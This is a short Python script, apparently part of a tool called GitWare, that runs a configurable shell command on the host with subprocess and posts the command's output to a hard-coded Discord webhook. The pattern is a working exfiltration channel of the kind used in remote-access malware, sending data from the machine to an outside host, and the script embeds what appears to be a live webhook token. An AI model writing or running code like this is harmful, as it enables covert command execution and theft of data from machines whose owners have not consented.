import requests
import subprocess

webhook = "https://discord.com/api/webhooks/1426929306164002818/Nv5g-5Z8yoW5hHGIPSIoLgHRR2jX2Hj8DeWcry6wIKzETvnRYI8fp81tK56xuo6KzKpH"
COMMAND = """dir""" # Replace this with the command you want to execute.
result = subprocess.run(COMMAND, shell=True, capture_output=True, text=True)

data = {
    "content": f"""Result to the command: `{COMMAND}`
    ```{result.stdout}``` """,
    "username": "GitWare Bot",
    "avatar":"https://github.com/orkkz/GitWare/blob/main/resources/gitware_symbol.png?raw=true"
}   
response = requests.post(webhook, json=data)
